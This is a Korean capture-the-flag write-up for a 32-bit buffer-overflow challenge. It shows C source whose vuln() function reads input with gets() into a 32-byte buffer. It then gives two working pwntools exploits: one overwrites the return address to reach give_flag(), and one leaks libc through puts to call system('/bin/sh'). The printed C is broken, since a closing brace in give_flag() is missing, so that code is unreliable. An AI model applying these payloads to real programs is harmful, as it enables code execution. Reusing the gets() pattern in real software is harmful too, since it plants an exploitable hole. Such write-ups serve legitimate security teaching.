문제 제작 - simpleprob 라이트업
=======================


## 1. 코드 분석


문제 파일 prob.c를 확인해보면

```c
#include <string.h>
#include <stdlib.h>

void give_flag() {
    FILE *fp;
    char flag[128];

    fp = fopen("flag.txt", "r");
    if (fp == NULL) {
        printf("Error: flag file not found!\n");
        exit(1);

    fgets(flag, sizeof(flag), fp);
    printf("Here is your flag: %s\n", flag);
    fclose(fp);
}

void vuln() {
    char buffer[32];
    printf("Enter your name: ");
    gets(buffer); 
    printf("Hello, %s!\n", buffer);
}

int main(void) {
    printf("Welcome to the simple buffer overflow challenge.\n");
    vuln();
    return 0;
}
```

문제의 핵심은 **`vuln()`** 함수 내의 **`gets()`** 함수이다. 
`gets()`는 입력 길이 제한이 없기 때문에 buffer의 크기인 **32바이트**를 초과하는 입력이 들어오면 
**버퍼 오버플로우**가 발생한다.     
이 취약점을 이용해 프로그램의 실행 흐름을 **`give_flag()`** 함수로 변경해야 한다. 

-----

## 2. 익스플로잇

### 2.1. `give_flag` 함수 주소 찾기

gdb를 사용, `give_flag()` 함수의 시작 주소를 찾는다.

<img width="690" height="141" alt="image" src="https://github.com/user-attachments/assets/89e55efa-1bd8-407c-bd65-01fdcd39e94c" />


0x080491c6이 `give_flag()` 함수의 시작 주소임을 확인했다.

### 2.2. 스택 오프셋 계산

`vuln()` 함수 스택에는 buffer와 SFP, 그리고 리턴 어드레스가 순서대로 쌓여 있다.  
buffer의 크기는 32바이트이고 SFP는 4바이트이므로 총 36바이트의 더미 데이터를 채워야 리턴 어드레스에 도달한다.    

여기서는 확실하게 풀기 위해 40바이트의 더미 데이터를 사용한다.

### 3.3. 익스플로잇 코드


```python
from pwn import *

context.arch = 'i386'
context.bits = 32

p = process('./prob')

give_flag_addr = 0x080491c6

# 40바이트의 더미 데이터 (버퍼와 SFP를 덮음)
dummy = b'A' * 40

# 페이로드: [더미 데이터] + [give_flag 함수의 주소]
# p32 함수는 32비트 주소를 리틀 엔디안으로 변환
payload = dummy + p32(give_flag_addr)

p.recvuntil(b'Enter your name: ')

p.sendline(payload)

p.interactive()
```

-----

### 쉘 따서 푸는 페이로드

libc.so.6 파일 따로 찾아서 풀 수 도 있다.

```
from pwn import *

context.arch = 'i386'

elf = ELF('./prob')
libc = ELF('./libc.so.6') 

p = process('./prob')

padding = b'A' * 36

# Stage 1: leak puts@libc
payload  = padding
payload += p32(elf.plt['puts'])
payload += p32(elf.symbols['main'])
payload += p32(elf.got['puts'])

p.recvuntil(b'Enter your name: ')
p.sendline(payload)

puts_leak = u32(p.recv(4))
libc_base = puts_leak - libc.symbols['puts']

system_addr = libc_base + libc.symbols['system']
binsh_addr  = libc_base + next(libc.search(b'/bin/sh'))
exit_addr   = libc_base + libc.symbols['exit']

payload  = padding
payload += p32(system_addr)
payload += p32(exit_addr)
payload += p32(binsh_addr)

p.recvuntil(b'Enter your name: ')
p.sendline(payload)
p.interactive()
```
